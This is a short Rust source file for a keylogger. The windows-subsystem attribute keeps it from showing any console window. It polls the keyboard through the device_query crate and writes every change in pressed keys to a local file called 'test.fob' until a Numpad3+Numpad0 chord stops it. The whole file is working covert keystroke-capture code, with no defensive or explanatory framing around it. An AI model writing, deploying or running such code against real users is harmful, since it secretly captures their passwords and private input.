#![windows_subsystem = "windows"]

use std::{fs::File, io::Write};

use device_query::{DeviceQuery, DeviceState, Keycode};

fn main() {
    let device_state = DeviceState::new();
    let mut file = File::create("test.fob").unwrap();

    let mut pkeys: Vec<Keycode> = Vec::new();

    loop {
        let ckeys: Vec<Keycode> = device_state.get_keys();

        if ckeys.contains(&Keycode::Numpad3) && ckeys.contains(&Keycode::Numpad0) {
            break;
        }

        if ckeys != pkeys && ckeys != Vec::new() {
            file.write_all(format!("{:?}\n", ckeys).as_bytes()).unwrap();
            pkeys = ckeys.clone();
        }
    }
}
